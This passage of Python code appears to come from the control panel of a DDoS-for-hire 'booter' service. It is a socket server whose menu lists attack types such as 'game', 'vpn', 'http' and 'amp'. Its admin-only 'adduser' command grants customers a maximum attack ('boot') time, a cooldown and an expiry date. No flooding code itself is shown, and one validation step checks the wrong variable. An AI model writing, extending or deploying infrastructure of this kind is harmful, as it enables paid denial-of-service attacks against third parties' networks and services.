            elif 'home' == msg[0]:
                cls(conn)
                printhome(conn)
            elif 'game' == msg[0]:
                cls(conn)
                printgame(conn)
            elif 'server' == msg[0]:
                cls(conn)
                printserver(conn)
            elif 'vpn' == msg[0]:
                cls(conn)
                printvpn(conn)
            elif 'http' == msg[0]:
                cls(conn)
                printhttp(conn)
            elif 'amp' == msg[0]:
                cls(conn)
                printamp(conn)
            elif 'cls' in msg[0] or 'clear' in msg[0]:
                cls(conn)
                conn.send(bytes(menus.BANNER,'UTF-8'))
                continue
            elif 'creds' in msg[0]:
                cls(conn)
                conn.send(bytes(menus.CREDS,'UTF-8'))
            elif 'adduser' in msg[0]:
                if not isadmin:
                    conn.send(bytes(f'                         {RED}Error: {BLUE}You do not have permission to add users','UTF-8'))
                    continue
                conn.send(bytes(f'                         {BLUE}Enter Username{PURPLE}: ','UTF-8'))
                newuser = msgrec(conn)
                conn.send(bytes(f'                         {BLUE}Enter Password{PURPLE}: ','UTF-8'))
                newpass = msgrec(conn)
                conn.send(bytes(f'                         {BLUE}Enter Max Boot Time{PURPLE}: ','UTF-8'))
                newmaxtime = msgrec(conn)
                conn.send(bytes(f'                         {BLUE}Enter Cooldown{PURPLE}: ','UTF-8'))
                newcooldown = msgrec(conn)
                conn.send(bytes(f'                         {BLUE}Expiry Date in days from today{PURPLE}: ','UTF-8'))
                if not re.match("^[A-Za-z0-9@#%]*$",newpass):
                    conn.send(bytes(f'                         {BLUE}Password can only contain letters, numbers, or @ % #','UTF-8'))
                    continue
                days = msgrec(conn)
                try:
                    maxtimeint = int(newmaxtime)
                    if 1 <= maxtimeint <= 10000:
                        pass
                    else:
                        raise ValueError
                except ValueError:
                    conn.send(bytes(f'                         {RED}Error: {BLUE}Enter a max time between 1 and 10000 ','UTF-8'))
                    continue
                try:
                    cooldownint = int(cooldown)
                    if 0 <= cooldownint <= 120:
                        pass
                    else:
                        raise ValueError
                except ValueError:
                    conn.send(bytes(f'                         {RED}Error: {BLUE}Enter a cooldown between 0 and 120 ','UTF-8'))
                    continue
                try:
                    daysint = int(days)
                    if 1 <= daysint <= 9999:
                        pass
                    else:
                        raise ValueError
                except ValueError:
                    conn.send(bytes(f'                         {RED}Error: {BLUE}Enter a expiry between 1 and 9999 ','UTF-8'))
                    continue
                hashpass = sha256(bytes(newpass,'UTF-8')).hexdigest()
                enddate = datetime.datetime.now() + datetime.timedelta(days=int(days))
                enddatestr = enddate.strftime('%m/%d/%Y')

                with open("db.txt",'a') as f:
                    f.write("\n")
                    f.write(f"{newuser},{hashpass},0,{newmaxtime},{newcooldown},{enddatestr}")
                with open("useradds.log",'a') as f:
                            f.write("\n")
                            f.write(f"[{datetime.datetime.now().strftime('%m/%d/%Y %H:%M:%S')}] {user} ADDED A NEW USER {newuser} FROM IP {addr}")
                conn.send(bytes(f'                         {PURPLE}{newuser} {BLUE}has been added!','UTF-8'))
            else:
                conn.send(bytes(f'           {BLUE}{msg[0]} is {RED}not {BLUE}a valid command. Type {PURPLE}? {BLUE}or {PURPLE}help{BLUE}.','UTF-8'))
        except Exception as e:
            print(str(e))
            break

def handleconns():
    while True:
        conn,addr = s.accept()
        print(f'NEW CONNECTION FROM {addr}')
        connthread = threading.Thread(target=login, args=[conn,addr])
        connthread.start()
handleconns()
